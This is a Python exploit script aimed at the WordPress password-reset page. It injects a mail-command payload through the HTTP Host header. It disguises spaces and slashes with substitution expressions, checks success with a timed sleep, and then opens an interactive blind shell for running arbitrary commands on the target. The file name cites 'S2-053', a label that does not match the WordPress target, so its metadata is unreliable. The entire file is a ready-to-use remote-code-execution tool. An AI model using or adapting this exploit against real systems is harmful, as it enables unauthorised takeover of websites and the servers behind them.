#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# @author JourWon
# @date 2021/4/8
# @file S2-053-EXP.py.py
import requests
import sys

def attract(url, cmd,username):
    cmd = cmd.replace(' ', '${substr{10}{1}{$tod_log}}')
    cmd = cmd.replace('/', '${substr{0}{1}{$spool_directory}}')
    payload = 'aa(any -froot@localhost -be ${run{' + cmd + '}} null)'
    headers = {"Host": payload}
    data = {"user_login":username, "wp-submit": "Get+New+Password"}
    try:
        requests.post(url, headers=headers, data=data, timeout=5)
        return False
    except requests.ReadTimeout:
        return True

def main():
    if len(sys.argv) < 3:
        print("Simple:Python3 wp-rce-exp.py http://xxxx.com:80/ admin")
        exit()
    url = sys.argv[1].strip() + '/wp-login.php?action=lostpassword'
    username = sys.argv[2]
    if requests.get(url).status_code != 200:
        print('url访问出错，检查网站'+url+'是否能正常访问')
        exit()
    if attract(url, "/bin/sleep 5",username):
        print("Success,网站存在RCE漏洞。请输入命令执行（exit退出！）")
    else:
        print("Fail!可能不存在漏洞！,请检查"+username+"用户是否存在,或手工检测漏洞！")
        exit()
    while True:
        cmd = input("Test_blind_shell>>>")
        if cmd != "exit":
            attract(url, cmd,username)
        else:
            exit()


if __name__ == '__main__':
    main()
